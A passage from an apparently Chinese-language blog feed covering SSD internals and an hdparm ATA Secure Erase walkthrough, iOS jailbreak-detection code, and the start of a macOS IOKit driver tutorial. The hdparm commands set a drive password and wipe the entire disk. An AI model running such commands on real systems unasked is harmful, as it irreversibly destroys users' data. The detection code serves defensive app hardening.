, Linux-2.6.33 以上。</li><li>固件： SSD 的厂商在固件里要放有 Trim 算法，也就是 SSD 的主控制器必须认识 Trim 指令。</li><li>驱动： 控制器驱动必须要支持 Trim 指令的传输，也就是能够将 Trim 指令传输到 SSD 控制器。MS 的驱动，Intel 的 AHCI 驱动目前支持。别的要看之后的更新了。<br>目前，RAID 阵列里的盘明确不支持 TRIM，不过 RAID 阵列支持 GC。</li></ul><h4 id="OP（Over-provisioning）预留空间"><a href="#OP（Over-provisioning）预留空间" class="headerlink" title="OP（Over-provisioning）预留空间"></a>OP（Over-provisioning）预留空间</h4><p>SSD上的OP指的是用户不可操作的容量，大小为实际容量减去用户可用容量，OP区域一般被用于优化操作如：WL，GC和坏块映射等。<br>OP一般分三层（见下图）。第一层容量固定为SSD标称容量的7.37%，这是因为标称容量采用千进制为单位，而NAND颗粒容量单位为1024进制，两者正好相差约7.37%。这部分空间被默认用于作OP。第二层OP是否存在及容量大小取决于厂商设置。第三层OP是用户在日常使用中可以分配的，像Fusion-IO公司还给其用户提供工具让他们自行调节大小以满足不同的耐用度及性能要求，一般用户也可以自己在初次分区的时候，不把所有的SSD容量都分满来达到相同目的，此处有一点要注意，若非首次分区就留出空间，必须要先进行全盘擦除，否则没有效果。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/op_1.png?raw=true" alt="po1"></p><p>虽然OP会减少SSD的可用容量，但有减少WA、提高寿命、性能的正面作用。请看下图：两个相同的64G SSD，左边的分区50G，右边的全部容量分区。格式化后容量分别为：46G和59G左右。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/op_2.png?raw=true" alt="po2"></p><p>我们知道在操作系统下,要写入共59G的数据时，左边的盘必须删除13G的‘无效’数据才行。右边的盘不需擦除就能写入所有59G数据，由SSD映射表的操作方式可知，删除后继续写入的数据在物理上会继续写入整个盘（写入OP1和OP2），在LBA上会覆盖被删除数据的地址。也就是说，同样写入59G数据，左边的盘已经包含了13G“无效”数据了。（那些被重映射到预留空间的数据，原地址数据就是“无效”、“过期”的）。所以说图中SSD里LBA上数据“有效”的机会比右边要少，因为LBA容量小(分区小)，所以在做垃圾回收处理时，需要复制的“有效”数据也少了，自然效率就提高了。<br>一般来说，建议在不支持Trim或对SSD的性能有较高要求的时候，如数据库等类的应用，增加一定比例的第三层OP容量（此空间需要先做HDD ERASE，保证没有被使用过），可以很好的起到保持速度，提高寿命的作用。（如必须用SSD组建RAID时，强烈建议留部分OP容量以弥补没有Trim产生的影响。）</p><h4 id="WA（Write-Amplification）写入放大"><a href="#WA（Write-Amplification）写入放大" class="headerlink" title="WA（Write Amplification）写入放大"></a>WA（Write Amplification）写入放大</h4><p>WA是闪存及SSD相关的一个极为重要的属性。由于闪存必须先擦除才能再写入的特性，在执行这些操作时，数据都会被移动超过1次。这些重复的操作不单会增加写入的数据量，还会减少闪存的寿命，更吃光闪存的可用带宽而间接影响随机写入性能。<br>举个最简单的栗子：当要写入一个4KB的数据时，最坏的情况是一个块里已经没有干净空间了，但有无效的数据可以擦除，所以主控就把所有的数据读到缓存，擦除块，缓存里更新整个块的数据，再把新数据写回去，这个操作带来的写入放大就是: 实际写4K的数据，造成了整个块（共1024KB）的写入操作，那就是放大了256倍。同时还带来了原本只需要简单一步写入4KB的操作变成：闪存读取 (1024KB)→缓存改（4KB）→闪存擦除（1024KB）→闪存写入（1024KB），共四步操作，造成延迟大大增加，速度变慢。所以说WA是影响 SSD随机写入性能和寿命的关键因素。  </p><p>以100%随机4KB来写入，目前的大多数SSD主控，在最坏的情况下WA可以达到100以上。如果是100%持续的从低LBA写入到高LBA的话，WA可以做到1，实际使用中写入放大会介于这两者之间。<br>用户还可以设置一定的OP（预留空间）来减少WA，假设你有个128G的SSD，你只分了64G 的容量使用，那最坏情况下的写入放大就能减少约3倍。<br>许多因素影响SSD的WA。下面列出主要的因素，以及它们如何影响WA。</p><ol><li>垃圾回收（GC）— 虽然增加了写入放大，但是速度有提升。 这个比较特殊的算法用来移动，合并，擦除闪存块来提升效率。（详见GC章节）</li><li>预留空间（OP）— 减少写入放大。（预留空间越大，写入放大越低） 在SSD上划出部分空间留给主控做优化，是用户不能操作的空间。（详见OP章节）</li><li>Trim 开启后可以减少写入放大。 一个ATA指令，由操作系统发送给SSD主控，告诉主控哪些数据是无效的并且可以不用做垃圾回收操作。（详见Trim章节）</li><li>可用容量减少写入放大。（可用空间越大，写入放大越低） 用户使用中没有用到的空间。（需要有Trim支持，不然不会影响写入放大。）</li><li>安全擦除 Secure Erase 减少写入放大， ATA安全擦除命令用来清除在磁盘上的所有用户数据，这个指令会让SSD回到出厂时的性能（最优性能，最少写入放大），但是随着使用时间变长，GC操作恢复后，写入放大又会慢慢增加回来。许多软件使用ATA安全擦除指令来重置磁盘，最著名的为HDDErase。对SSD来说，重置就是（除了OP区域内的部分私有区域外的）全盘擦除操作，瞬间即可完成清除所有数据让SSD回到初始状态。但要注意，每操作一次，全盘寿命P/E次数减1。</li><li>持续写入（Sequential writes）减少写入放大。理论上来说，持续写入的写入放大为1，但是某些因素还是会影响这个数值。</li><li>静态/动态数据分离（Separating Static and Dynamic Data）减少写入放大。高端SSD主控制器支持静态和动态数据的分离处理，此操作要求SSD主控制器对LBA里经常写入（动态数据，热数据）和不经常写入（静态数据，冷数据）的数据块进行归类，因为如果块里同时包含了静态和动态数据，在做GC操作的时候会为了改写其实没必要的静态数据而增加写入放大，所以把包含静态数据的块归类后，因为不常改写，写入放大就减少了。但是迟早SSD主控会把这些静态的数据转移到别的地方来进行磨损平衡。（因为静态数据占着的数据块一直不改写，编程次数低于平均值的话，会造成颗粒磨损不平衡，违背了磨损平衡，确实非常矛盾的。）</li><li>随机写入（Random writes）提高写入放大，不好 随机写入会写入很多非连续的LBA，将会大大提升写入放大。</li><li>磨损平衡（WL）直接提高写入放大，不好 确保闪存的每个块被写入的次数相等的一种机制。</li></ol><h4 id="BBM（Bad-Block-Management）坏块管理"><a href="#BBM（Bad-Block-Management）坏块管理" class="headerlink" title="BBM（Bad Block Management）坏块管理"></a>BBM（Bad Block Management）坏块管理</h4><p>不管磨损平衡算法如何聪明，在运作中都会碰到一个头痛的问题，那就是坏块，所以一个SSD必须要有坏块管理机制。何谓坏块？一个NAND块里包含有不稳定的地址，不能保证读/写/擦的时候数据的准确性。其概念和传统机械式硬盘的坏块相似。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/bbm_1.jpg" alt="bbm1"></p><p>坏块分出厂坏块和使用过程中出现的坏块，和机械式硬盘的坏块表一样(P表和G表)，SSD也有坏块表。出厂坏块的话，在坏块上会有标记，所以很容易就能被识别，后期使用中出现的坏块就要靠主控制器的能力了，一般来说，越到NAND生命的后期(P/E数开始接近理论最大值)，坏块就会开始大量出现了。NAND出厂前都会被执行擦除操作，厂商会在出货前会把坏块标记出来(厂商会在坏块的第一个页的SA区上打上标记)。这样坏块管理软件就能靠监测SA区标记来制作坏块表。SA区的意思是页中4096~4319的区域，用户不可访问，主要用来存放ECC算法、坏块信息、文件系统资料等。由于在使用中会产生坏块，所以SSD的每次编程/擦除/复制等操作后都要检查块的状态。对颗粒的ECC要求也要达到厂商的标准以上(主控强不强，看ECC能力也是一个参考)。</p><h4 id="ECC（Error-Checking-and-Correction）校验和纠错"><a href="#ECC（Error-Checking-and-Correction）校验和纠错" class="headerlink" title="ECC（Error Checking and Correction）校验和纠错"></a>ECC（Error Checking and Correction）校验和纠错</h4><p>ECC的全称是Error Checking and Correction，是一种用于Nand的差错检测和修正算法。由于NAND Flash的工艺不能保证NAND在其生命周期中保持性能的可靠，因此，在NAND的生产中及使用过程中会产生坏块。为了检测数据的可靠性，在应用NAND Flash的系统中一般都会采用一定的坏区管理机制，而管理坏区的前提是能比较可靠的进行坏区检测。如果操作时序和电路稳定性不存在问题的话，NAND Flash出错的时候一般不会造成整个Block或是Page不能读取或是全部出错，而是整个Page中只有一个或几个bit出错，这时候ECC就能发挥作用了。不同颗粒有不同的基本ECC要求，不同主控制器支持的ECC能力也不同，理论上说主控越强ECC能力越强</p><h3 id="0x02-SSD安全擦除原理和工具"><a href="#0x02-SSD安全擦除原理和工具" class="headerlink" title="0x02 SSD安全擦除原理和工具"></a>0x02 SSD安全擦除原理和工具</h3><p>ATA安全擦除命令用来清除在磁盘上的所有用户数据，这个指令会让SSD回到出厂时的性能（最优性能，最少写入放大），但是随着使用时间变长，GC操作恢复后，写入放大又会慢慢增加回来。许多软件使用ATA安全擦除指令来重置磁盘，最著名的为HDDErase。对SSD来说，重置就是（除了OP区域内的部分私有区域外的）全盘擦除操作，瞬间即可完成清除所有数据让SSD回到初始状态。但要注意，每操作一次，全盘寿命P/E次数减1。</p><h4 id="使用hdparm进行安全擦除步骤"><a href="#使用hdparm进行安全擦除步骤" class="headerlink" title="使用hdparm进行安全擦除步骤"></a>使用hdparm进行安全擦除步骤</h4><h4 id="Step-1-确保驱动器安全未冻结："><a href="#Step-1-确保驱动器安全未冻结：" class="headerlink" title="Step 1 - 确保驱动器安全未冻结："></a>Step 1 - 确保驱动器安全未冻结：</h4><p>发送以下命令，X为对应的设备（如sda）</p><p><code>hdparm -I /dev/X</code></p><p>命令输出（确保驱动器”not frozen”）：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Security: </div><div class="line">       Master password revision code = <span class="number">65534</span></div><div class="line">               supported</div><div class="line">       <span class="built_in">not</span>     enabled</div><div class="line">       <span class="built_in">not</span>     <span class="built_in">locked</span></div><div class="line">     [ <span class="built_in">not</span>     frozen ]</div><div class="line">       <span class="built_in">not</span>     expired: security <span class="built_in">count</span></div><div class="line">               supported: enhanced erase</div><div class="line">       <span class="number">2</span><span class="built_in">min</span> <span class="keyword">for</span> SECURITY ERASE UNIT. <span class="number">2</span><span class="built_in">min</span> <span class="keyword">for</span> ENHANCED SECURITY ERASE UNIT.</div></pre></td></tr></table></figure><p>如果命令输出显示为”frozen”，那么不能继续下一步。<br>如果您的驱动器被冻结并启用了密码，请尝试使用BIOS删除密码，并关闭系统电源，看看是否禁用冻结。否则，您可能需要使用不同的主板（使用不同的BIOS）。</p><h4 id="Step-2-通过设置用户密码启用安全性："><a href="#Step-2-通过设置用户密码启用安全性：" class="headerlink" title="Step 2 - 通过设置用户密码启用安全性："></a>Step 2 - 通过设置用户密码启用安全性：</h4><p><strong>警告：设置用户密码后，下一次上电后驱动器将被锁定（只有使用正确的密码解锁，不然驱动器将拒绝正常访问）。</strong></p><h5 id="Step-2a-设置用户密码："><a href="#Step-2a-设置用户密码：" class="headerlink" title="Step 2a - 设置用户密码："></a>Step 2a - 设置用户密码：</h5><p>任何密码都可以，因为这只能是临时的。安全擦除后，密码将设置为NULL。在这里，我们将使用密码“Eins”。</p><p><code>hdparm --user-master u --security-set-pass Eins /dev/X</code></p><p>命令输出:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">security_password=<span class="string">"Eins"</span></div><div class="line"></div><div class="line">/dev/sdd:</div><div class="line">Issuing SECURITY_SET_PASS command, password=<span class="string">"Eins"</span>, <span class="keyword">user</span>=<span class="keyword">user</span>, mode=high</div></pre></td></tr></table></figure><h5 id="Step-2b-成功后然后执行"><a href="#Step-2b-成功后然后执行" class="headerlink" title="Step 2b - 成功后然后执行"></a>Step 2b - 成功后然后执行</h5><p><code>hdparm -I /dev/X</code></p><p>命令输出(应显示为”enable”)：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Security: </div><div class="line">       Master password revision code = <span class="number">65534</span></div><div class="line">               supported</div><div class="line">             [ enabled ]</div><div class="line">       <span class="built_in">not</span>     <span class="built_in">locked</span></div><div class="line">       <span class="built_in">not</span>     frozen</div><div class="line">       <span class="built_in">not</span>     expired: security <span class="built_in">count</span></div><div class="line">               supported: enhanced erase</div><div class="line">       Security level high</div><div class="line">       <span class="number">2</span><span class="built_in">min</span> <span class="keyword">for</span> SECURITY ERASE UNIT. <span class="number">2</span><span class="built_in">min</span> <span class="keyword">for</span> ENHANCED SECURITY ERASE UNIT.</div></pre></td></tr></table></figure><h4 id="Step-3-发送ATA安全擦除命令"><a href="#Step-3-发送ATA安全擦除命令" class="headerlink" title="Step 3 - 发送ATA安全擦除命令:"></a>Step 3 - 发送ATA安全擦除命令:</h4><p><code>time hdparm --user-master u --security-erase Eins /dev/X</code></p><p>等待命令完成,此示例输出显示Intel X25-M 80GB SSD花费大约40秒<br>命令输出：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="attr">security_password=</span><span class="string">"Eins"</span></div><div class="line"></div><div class="line"> /dev/sdd:</div><div class="line">Issuing SECURITY_ERASE command, <span class="attr">password=</span><span class="string">"Eins"</span>, <span class="attr">user=</span><span class="keyword">user</span></div><div class="line"><span class="title">0</span>.<span class="number">000</span>u <span class="number">0.000s</span> <span class="number">0</span>:<span class="number">39.71</span> <span class="number">0.0</span>%      <span class="number">0</span>+<span class="number">0</span>k <span class="number">0</span>+<span class="number">0</span>io <span class="number">0</span>pf+<span class="number">0</span>w</div></pre></td></tr></table></figure><h4 id="Step-4-驱动器已经被擦除，-验证安全性是否禁用"><a href="#Step-4-驱动器已经被擦除，-验证安全性是否禁用" class="headerlink" title="Step 4 - 驱动器已经被擦除， 验证安全性是否禁用:"></a>Step 4 - 驱动器已经被擦除， 验证安全性是否禁用:</h4><p>成功擦除后，驱动器安全性应自动设置为禁用（因此不再需要访问密码）。通过运行以下命令验证这一点：</p><p><code>hdparm -I /dev/X</code></p><p>命令输出（应显示为禁用）：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Security: </div><div class="line">       Master password revision code = <span class="number">65534</span></div><div class="line">               supported</div><div class="line">     [ <span class="built_in">not</span>     enabled ]</div><div class="line">       <span class="built_in">not</span>     <span class="built_in">locked</span></div><div class="line">       <span class="built_in">not</span>     frozen</div><div class="line">       <span class="built_in">not</span>     expired: security <span class="built_in">count</span></div><div class="line">               supported: enhanced erase</div><div class="line">       <span class="number">2</span><span class="built_in">min</span> <span class="keyword">for</span> SECURITY ERASE UNIT. <span class="number">2</span><span class="built_in">min</span> <span class="keyword">for</span> ENHANCED SECURITY ERASE UNIT.</div></pre></td></tr></table></figure><h3 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h3><ul><li><a href="http://rick_stone.leanote.com/post/%E8%AF%B4%E8%B5%B7%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E5%92%8C%E5%9B%BA%E6%80%81%E7%A1%AC%E7%9B%98%EF%BC%88%E4%BA%8C%EF%BC%89" target="_blank" rel="external">http://rick_stone.leanote.com/post/%E8%AF%B4%E8%B5%B7%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E5%92%8C%E5%9B%BA%E6%80%81%E7%A1%AC%E7%9B%98%EF%BC%88%E4%BA%8C%EF%BC%89</a></li><li><a href="http://www.jinbuguo.com/storage/ssd_intro.html" target="_blank" rel="external">http://www.jinbuguo.com/storage/ssd_intro.html</a></li><li><a href="https://ata.wiki.kernel.org/index.php/ATA_Secure_Erase" target="_blank" rel="external">https://ata.wiki.kernel.org/index.php/ATA_Secure_Erase</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SSD与安全擦除&quot;&gt;&lt;a href=&quot;#SSD与安全擦除&quot; class=&quot;headerlink&quot; title=&quot;SSD与安全擦除&quot;&gt;&lt;/a&gt;SSD与安全擦除&lt;/h2&gt;&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;目录&lt;br&gt;0x01 SSD简介&lt;br&gt;
      
    
    </summary>
    
      <category term="杂" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/%E6%9D%82/"/>
    
    
      <category term="SSD" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/SSD/"/>
    
  </entry>
  
  <entry>
    <title>常见iOS越狱检测手段</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/07/iOS%E8%B6%8A%E7%8B%B1%E6%A3%80%E6%B5%8B/iOS%E8%B6%8A%E7%8B%B1%E6%A3%80%E6%B5%8B/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/07/iOS越狱检测/iOS越狱检测/</id>
    <published>2017-08-07T10:37:59.000Z</published>
    <updated>2017-08-07T10:41:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="iOS越狱检测"><a href="#iOS越狱检测" class="headerlink" title="iOS越狱检测"></a>iOS越狱检测</h2><blockquote><blockquote><p>如何检测越狱其实就是检测越狱后与非越狱的差异。一句话说明越狱检测原理主要便是检测相关权限，也很容易想到，因为越狱使得权限很大得到了提升。比如某些目录是否能访问，是否安装某些动态库，是否安装某些app等，另外建议对检测的类名及方法名进行混淆，对关键字符串进行加密等手段。</p><p>注:以下代码均已在真机上测试完成<br>Demo工程代码<a href="https://github.com/NULL-ME/NULL-ME.github.io/tree/master/articlePic/JailbreakCheckDemo">地址</a></p></blockquote></blockquote><h3 id="1-使用NSFileManager检测是否安装常见越狱工具"><a href="#1-使用NSFileManager检测是否安装常见越狱工具" class="headerlink" title="1. 使用NSFileManager检测是否安装常见越狱工具"></a>1. 使用NSFileManager检测是否安装常见越狱工具</h3><p>注：采用<code>NSFileManager</code>存在可能被hook的情况，最好结合底层<code>stat</code>等函数双重检测</p><p><strong>示例代码</strong></p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line">常见越狱工具路径：</div><div class="line">/Library/MobileSubstrate/MobileSubstrate.dylib </div><div class="line">/Applications/Cydia.app   </div><div class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">cydia</span>/</span></div><div class="line">/var/cache/apt   </div><div class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">apt</span>    </span></div><div class="line">/etc/apt </div><div class="line">/bin/bash </div><div class="line">/bin/sh </div><div class="line">/usr/sbin/sshd   </div><div class="line">/usr/libexec/ssh-keysign   </div><div class="line">/etc/ssh/sshd_config</div><div class="line">*<span class="regexp">/</span></div><div class="line"></div><div class="line">- (BOOL)checkPath</div><div class="line">&#123;</div><div class="line"> BOOL jailBroken = NO;</div><div class="line"></div><div class="line"> NSString * aptPath = @"/private<span class="regexp">/var/lib</span><span class="regexp">/apt";</span></div><div class="line"></div><div class="line"> if ([[NSFileManager defaultManager] fileExistsAtPath:aptPath]) &#123;</div><div class="line">     jailBroken = YES;</div><div class="line"> &#125;</div><div class="line"> </div><div class="line">return jailBroken;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="2-使用stat系列函数检测常用越狱工具"><a href="#2-使用stat系列函数检测常用越狱工具" class="headerlink" title="2. 使用stat系列函数检测常用越狱工具"></a>2. 使用stat系列函数检测常用越狱工具</h3><p><strong>示例代码</strong></p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//头文件 #import &lt;sys/stat.h&gt;</span></div><div class="line"><span class="comment">//路径同上</span></div><div class="line"><span class="comment">//使用stat系列函数检测</span></div><div class="line"></div><div class="line">    struct <span class="keyword">stat</span> stat_info<span class="comment">;</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="number">0</span> == <span class="keyword">stat</span>(<span class="string">"/Applications/Cydia.app"</span>, &amp;stat_info)) &#123;</div><div class="line">        jailbroken = YES<span class="comment">;</span></div><div class="line">    &#125;</div></pre></td></tr></table></figure><p>检测stat是否被替换</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int ret;</div><div class="line"></div><div class="line">Dl_info dylib_info;</div><div class="line"></div><div class="line">int <span class="comment">(*func_stat)(const char *,struct stat *)</span> = stat;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ((ret = dladdr(func_stat, &amp;dylib_info))) <span class="comment">&#123;</span></div><div class="line">    if (strcmp(dylib_info.dli_fname,"/usr/lib/system/libsystem_kernel.dylib") != 0) &#123; </div><div class="line">      jailbroken = YES; </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="3-检测程序运行的环境变量"><a href="#3-检测程序运行的环境变量" class="headerlink" title="3.检测程序运行的环境变量"></a>3.检测程序运行的环境变量</h3><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//检测当前程序运行的环境变量，防止通过DYLD_INSERT_LIBRARIES注入链接异常动态库，来更改相关工具名称</span></div><div class="line">- (<span class="built_in">BOOL</span>)checkEnv</div><div class="line">&#123;</div><div class="line"> <span class="keyword">char</span> *env = getenv(<span class="string">"DYLD_INSERT_LIBRARIES"</span>);</div><div class="line"> </div><div class="line"> <span class="built_in">NSLog</span>(<span class="string">@"%s"</span>, env);</div><div class="line"> </div><div class="line"> <span class="keyword">if</span> (env) &#123;</div><div class="line">     <span class="keyword">return</span> <span class="literal">YES</span>;</div><div class="line"> &#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">NO</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="4-dylib动态库检测"><a href="#4-dylib动态库检测" class="headerlink" title="4.dylib动态库检测"></a>4.dylib动态库检测</h3><p><strong>示例代码</strong></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//头文件 #import &lt;mach-o/dyld.h&gt;</span></div><div class="line"><span class="comment">//几乎所有的越狱机都会安装 Library/MobileSubstrate/MobileSubstrate.dylib动态库</span></div><div class="line"></div><div class="line">    uint32_t <span class="built_in">count</span> = <span class="variable">_dyld_image_count</span>();</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (uint32_t i = <span class="number">0</span> ; i &lt; <span class="built_in">count</span>; ++i) &#123;</div><div class="line"></div><div class="line">        NSString *<span class="built_in">name</span> = [[NSString alloc]initWithUTF8String:<span class="variable">_dyld_get_image_name</span>(i)];</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ([<span class="built_in">name</span> containsString:@<span class="string">"Library/MobileSubstrate/MobileSubstrate.dylib"</span>]) &#123;</div><div class="line">            jailbroken = YES;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><p><a href="http://www.jianshu.com/p/a43be50dc958" target="_blank" rel="external">http://www.jianshu.com/p/a43be50dc958</a></p></li><li><p><a href="http://www.freebuf.com/articles/wireless/6318.html" target="_blank" rel="external">http://www.freebuf.com/articles/wireless/6318.html</a></p></li></ul><ul><li><p><a href="http://www.jianshu.com/p/f664b1da8458" target="_blank" rel="external">http://www.jianshu.com/p/f664b1da8458</a></p></li><li><p><a href="http://www.jianshu.com/p/f220e63319eb" target="_blank" rel="external">http://www.jianshu.com/p/f220e63319eb</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;iOS越狱检测&quot;&gt;&lt;a href=&quot;#iOS越狱检测&quot; class=&quot;headerlink&quot; title=&quot;iOS越狱检测&quot;&gt;&lt;/a&gt;iOS越狱检测&lt;/h2&gt;&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;如何检测越狱其实就是检测越狱后与非越狱的差异。一
      
    
    </summary>
    
    
      <category term="iOS应用安全" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内核扩展-驱动开发实例</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/03/%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95-%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E4%BE%8B/%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95-%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E4%BE%8B/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/03/内核扩展-驱动开发实例/内核扩展-驱动开发实例/</id>
    <published>2017-08-03T11:27:59.000Z</published>
    <updated>2017-08-04T02:06:54.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>结合《OS X 内核编程》以及网上相关的学习，用一个例子来说明自己对macOS IOkit的理解</p></blockquote></blockquote><h2 id="0x00-一点概念"><a href="#0x00-一点概念" class="headerlink" title="0x00 一点概念"></a>0x00 一点概念</h2><p>操作系统可以理解成硬件的抽象或者说提供服务，如下图所示，在xnu内核之中，由mach微内核，IOKit，BSD三大组件构成。作为内核的一部分IOKit起着想当重要的作用，抽象IO设备，采用C++编写的IOKit框架使得硬件驱动具有模块化，便于扩展。<br><img src="/4ch12dy/4ch12dy.github.io.git/2017/08/03/内核扩展-驱动开发实例/内核扩展-驱动开发实例/king/4chendyBlog/blog/source/articlePic/kext/macOS框架.png" alt="mac0s框架"><br>程序难免会和相应的硬件交互，苹果定义了IOKit.framework，这个框架定义了一些与公共的接口，可以让用户层通过这些接口与一些标准的驱动程序进行交互。而驱动与用户程序之间到底是如何交互的？本篇就来分析其中的细节。</p><h2 id="0x01-驱动加载的过程"><a href="#0x01-驱动加载的过程" class="headerlink" title="0x01 驱动加载的过程"></a>0x01 驱动加载的过程</h2><p>当硬件插入电脑时，系统会根据硬件的类型创建一个Provider(提供者)的对象，并且这个Provider会在初使化的过程中去尝试匹配合适的驱动程序，如上图，我们开发一款适合于PCI声卡或USB音频设备的驱动程序，首先硬件载入后会去查找驱动程序Info.plist中的IOKitPersonalities的信息，如果IOProviderClass中定义了IOPCIDriver就表示可以为PCI做匹配，如果同时也有IOUSBDriver项就表示USB的设备也可以做匹配，同时如果有多个支持PCI或USB的驱动出现时，就会去调用驱动程序的probe方法，最终找到匹配度最高的驱动程序进行加载(实际的原理会更复杂)，然后该驱动程序就可以通过不同的Provider与硬件通信，并且通过标准的IOAudioDriver接口为系统提供音频的服务，从而用户程序就可以通过系统的标准方法最终让音频设备工作。<br><img src="/4ch12dy/4ch12dy.github.io.git/2017/08/03/内核扩展-驱动开发实例/内核扩展-驱动开发实例/king/4chendyBlog/blog/source/articlePic/kext/driver.png" alt="driver"></p><h2 id="0x02-创建驱动程序"><a href="#0x02-创建驱动程序" class="headerlink" title="0x02 创建驱动程序"></a>0x02 创建驱动程序</h2><p>打开Xcode，选择IOKit Driver模板，取名工程名IOKitTest，然后可以在工程中看到会自动创建两个文件，分别是IOKitTest.h和IOKitTest.cpp，但非常遗憾的是，模板并没有为我们在这两个文件中生成任何的内容。我们手动在IOKitTest.h中输入以下内容：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;IOKit/IOService.h&gt;</span></span></div><div class="line"><span class="keyword">class</span> com_osxkernel_driver_IOKitTest : <span class="keyword">public</span> IOService &#123;</div><div class="line">    </div><div class="line">    <span class="comment">//一个宏定义，会自动生成该类的构造方法、析构方法和运行时</span></div><div class="line">    